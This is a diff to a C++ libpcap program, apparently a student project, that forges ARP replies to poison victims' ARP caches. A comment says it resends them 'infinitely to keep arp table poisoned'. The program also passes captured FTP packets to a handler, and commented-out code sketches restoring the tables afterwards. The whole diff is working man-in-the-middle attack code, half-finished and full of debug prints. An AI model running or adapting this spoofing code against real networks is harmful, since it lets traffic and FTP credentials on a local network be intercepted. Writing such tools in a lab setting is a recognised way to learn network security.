@@ -2,6 +2,9 @@
 
 pcap_t *g_device = NULL;
 std::string g_ip_src;
+std::string g_ip_target;
+unsigned char *g_sll_addr;
+unsigned char g_sll_halen;
 
 Pcap::Pcap(const char *ip_src, const char *mac_src,
 	  const char *ip_target, const char *mac_target,
@@ -208,6 +211,10 @@ int	Pcap::setTimeout(pcap_t *src, int to_ms) const {
 	return pcap_set_timeout(src, to_ms);
 }
 
+int	Pcap::setNonBlock(char *errbuf, int val) {
+	return pcap_setnonblock(this->_device_capture, val, errbuf);
+}
+
 int	Pcap::setSelfMac() {
 	char errbuf[PCAP_ERRBUF_SIZE] = {0};
 	int res = pcap_findalldevs(&this->_pcap_list, errbuf);
@@ -312,8 +319,8 @@ static void convAddress(const std::string &src, uint8_t *addr,
 	addr[i] = std::stoi(substr, NULL, base);
 }
 
-static void forge_packet_reply(const u_char *bytes, bpf_u_int32 len,
-	unsigned char *buf, unsigned int len_buf) {
+static int forge_packet_reply(const u_char *bytes, bpf_u_int32 len,
+	unsigned char *buf, unsigned int len_buf, bool retrieve) {
 	const struct ether_header *eth = reinterpret_cast<const struct ether_header *>(bytes);
 	const struct ether_arp *arp= reinterpret_cast<const struct ether_arp *>(bytes + ETH_HLEN);
 	struct ether_header eth_cpy;
@@ -333,8 +340,14 @@ static void forge_packet_reply(const u_char *bytes, bpf_u_int32 len,
 	arp_cpy.ea_hdr.ar_hln = ETH_ALEN;
 	arp_cpy.ea_hdr.ar_pln = 4;
 	arp_cpy.ea_hdr.ar_op = htons(ARPOP_REPLY);
-	for (int i = 0; i < ETH_ALEN; i++) {
-		arp_cpy.arp_sha[i] = arp->arp_tha[i];
+	if (retrieve == false) {
+		for (int i = 0; i < ETH_ALEN; i++) {
+			arp_cpy.arp_sha[i] = arp->arp_tha[i];
+		}
+	} else {
+		for (int i = 0; i < ETH_ALEN; i++) {
+			arp_cpy.arp_sha[i] = arp->arp_sha[i];
+		}
 	}
 	convAddress(g_ip_src, arp_cpy.arp_spa, '.', 4, 10);
 	for (int i = 0; i < ETH_ALEN; i++) {
@@ -343,6 +356,16 @@ static void forge_packet_reply(const u_char *bytes, bpf_u_int32 len,
 	for (int i = 0; i < 4; i++) {
 		arp_cpy.arp_tpa[i] = arp->arp_spa[i];
 	}
+	//compare sender ip target ip if same then replace arp_spa par target
+	int same = 0;
+	for (int i = 0; i < 4; i++) {
+		if (arp_cpy.arp_spa[i] == arp_cpy.arp_tpa[i]) {
+			++same;
+		}
+	}
+	if (same == 4)
+		convAddress(g_ip_target, arp_cpy.arp_spa, '.', 4, 10);
+	//
 	//eth->ether_type = htons(0x0806);
 	/*convAddress(this->_mac_target, eth.ether_dhost, ':', ETH_HLEN, 16);
 	for (int i = 0; i < ETH_HLEN && i < this->_sll_halen; i++) {
@@ -367,8 +390,28 @@ static void forge_packet_reply(const u_char *bytes, bpf_u_int32 len,
 	*/
 	memcpy(buf, &eth_cpy, sizeof(struct ether_header));
 	memcpy(buf + ETH_HLEN, &arp_cpy, sizeof(struct ether_arp));
+	same = 0;
+	for (int i = 0; i < ETH_ALEN && i < g_sll_halen; i++) {
+		if (g_sll_addr[i] == eth->ether_dhost[i]) {
+			++same;
+		}
+	}
+	if (retrieve == true)
+		return 1;
+	if (retrieve == false && same == ETH_ALEN) {
+		return 1;
+	}
+	return 0;
+	//si (eth dest == self && source (target_mac ou src_mac))
+	//	ret 1
+	//sinon ret 0
+	
 }
 #include <unistd.h>
+/*
+ * Arp poison
+ * Resend infinitely to keep arp table poisoned
+ */
 static int	send_packet(unsigned char *buf, unsigned int len) {
 	if (!g_device)
 		return -1;
@@ -378,17 +421,19 @@ static int	send_packet(unsigned char *buf, unsigned int len) {
 		(const u_char *)buf, len);
 }
 
-static void handle_arp(const u_char *bytes, bpf_u_int32 len) {
+static void handle_arp(const u_char *bytes, bpf_u_int32 len,
+		       bool retrieve) {
 	unsigned char buf[BUFFER_SIZE] = { 0 };
+	int res = forge_packet_reply(bytes, len, buf, BUFFER_SIZE, retrieve);
+	if (res == 1) {
+		res = send_packet(buf, sizeof(buf)); // if err display error
 
-	forge_packet_reply(bytes, len, buf, BUFFER_SIZE);
-	int res = send_packet(buf, sizeof(buf)); // if err display error
-
-	if (res == PCAP_ERROR_ACTIVATED
-		|| res == PCAP_ERROR)
-		pcap_perror(g_device, "Error send packet: ");
-	else if (res == -1)
-		std::cerr << "No device found, can't reply." << std::endl;
+		if (res == PCAP_ERROR_ACTIVATED
+			|| res == PCAP_ERROR)
+			pcap_perror(g_device, "Error send packet: ");
+		else if (res == -1)
+			std::cerr << "No device found, can't reply." << std::endl;
+	}
 	std::ofstream old_cout;
 	const struct ether_arp *arp= reinterpret_cast<const struct ether_arp *>(bytes + ETH_HLEN);
 
@@ -479,15 +524,27 @@ static void handle_ftp(const u_char *bytes, bpf_u_int32 len){
  * FTP = 0x800
  * ARP = 0x806
  */
-static void handler(u_char *user, const struct pcap_pkthdr *h,
-	    const u_char *bytes) {
+void	handler(u_char *user, const struct pcap_pkthdr *h,
+		const u_char *bytes) {
 	const struct ether_header *eth = (const struct ether_header *)bytes;
+	//start retrieve
+	printf("arp:%d\n", g_free_arp);
+	/*if (g_free_arp == 1) {
+		//handle_arp(bytes, h->len, true);
+		printf("arp:%d\n", g_free_arp);
+	//	g_free_arp = 2;
+		printf("arp:%d\n", g_free_arp);
+		pcap_breakloop(g_device);
+	} else {
+	*/
 	printf("type: %x %x\n", eth->ether_type, ntohs(eth->ether_type));
 	if (eth && ntohs(eth->ether_type) == ETHERTYPE_ARP) { // ARP
-		handle_arp(bytes, h->len);
+		handle_arp(bytes, h->len, false);
 	} else if (eth && ntohs(eth->ether_type) == ETHERTYPE_IP) { // FTP
 		handle_ftp(bytes, h->len);
 	}
+	//}
+	std::cout<<"LOOP"<<std::endl;
 }
 
 int	Pcap::loopPcap(pcap_t *src) {
@@ -495,14 +552,58 @@ int	Pcap::loopPcap(pcap_t *src) {
 
 	if (!src)
 		return -1;
-	printf("src:%p\n", src);
 	g_device = src;
-	printf("src:%p\n", src);
 	g_ip_src = this->_ip_src;
+	g_ip_target = this->_ip_target;
+	g_sll_addr = this->_sll_addr;
+	g_sll_halen = this->_sll_halen;
+//	int res = pcap_loop(src, INFINITE, handler, NULL);
 	int res = pcap_loop(src, INFINITE, handler, NULL);
-	
-	printf("res:%d\n", res);
 	return res;
+
+	/*int res = pcap_dispatch(src, INFINITE, handler, NULL);
+
+	if (res == PCAP_ERROR || res == PCAP_ERROR_NOT_ACTIVATED) {
+		pcap_perror(src, "Error: ");
+		return res;
+	}
+	if (g_free_arp == 1) { // : send nettoyages requetes
+		char errbuf[PCAP_ERRBUF_SIZE] = { 0 };
+		int error = this->setNonBlock(errbuf, 0);
+
+		if (error == PCAP_ERROR_NOT_ACTIVATED) {
+			std::cout << "Device is not yet captured." << std::endl;
+		}
+		std::cout << "Is blocked << std::endl";
+	}
+	while (res != PCAP_ERROR_BREAK) {
+		res = pcap_dispatch(src, INFINITE, handler, NULL);
+		if (res == PCAP_ERROR || res == PCAP_ERROR_NOT_ACTIVATED) {
+			pcap_perror(src, "Error: ");
+			return res;
+		}
+		if (g_free_arp == 1) { // : send nettoyages requetes
+			char errbuf[PCAP_ERRBUF_SIZE] = { 0 };
+			int error = this->setNonBlock(errbuf, 0);
+
+			if (error == PCAP_ERROR_NOT_ACTIVATED) {
+				std::cout << "Device is not yet captured." << std::endl;
+			}
+			std::cout << "Is blocked" << std::endl;
+			break ;
+			//pcap_breakloop(src);
+			//sleep(1);
+			//return res;
+		}*//* else if (g_free_arp == 2) {
+			pcap_breakloop(src);
+		}*/
+		/*printf("res:%d\n", res);
+	}
+	std::cout << "wait loop" << std::endl;
+	this->forgePacketRequest(false);
+	this->forgePacketRequestSrc(false);
+	res = pcap_loop(src, INFINITE, handler, NULL);
+	return res;*/
 }
 
 int	Pcap::sendPacket() const {
